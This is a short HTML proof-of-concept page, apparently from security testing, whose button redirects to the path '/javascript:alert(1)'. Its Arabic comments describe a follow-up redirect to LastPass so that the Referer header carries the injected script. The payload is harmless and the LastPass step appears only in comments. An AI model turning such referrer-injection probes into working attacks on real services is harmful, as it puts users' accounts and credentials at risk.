<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Referrer Test</title>
</head>
<body>

    <h3>اختبار الـ Referrer المسار الملغم</h3>
    
    <!-- زر يقوم بالتوجيه إلى صفحة فرعية تحتوي على الكود في الرابط -->
    <button onclick="triggerExploit()">اضغط للانتقال</button>

    <script>
        function triggerExploit() {
            // سنوجه المستخدم أولاً إلى مسار يحتوي على "الكود" كجزء من الرابط
            // ثم من ذلك المسار يتم التوجيه إلى LastPass
            let payloadPath = "/javascript:alert(1)";
            
            // ملاحظة: لكي يرسل المتصفح الـ Referrer كاملاً، يجب أن نكون على خادم (Server)
            // المتصفحات الحديثة قد تقص المسار وتكتفي بالدومين فقط (Origin-only)
            window.location.href = payloadPath;
        }
    </script>

</body>
</html>
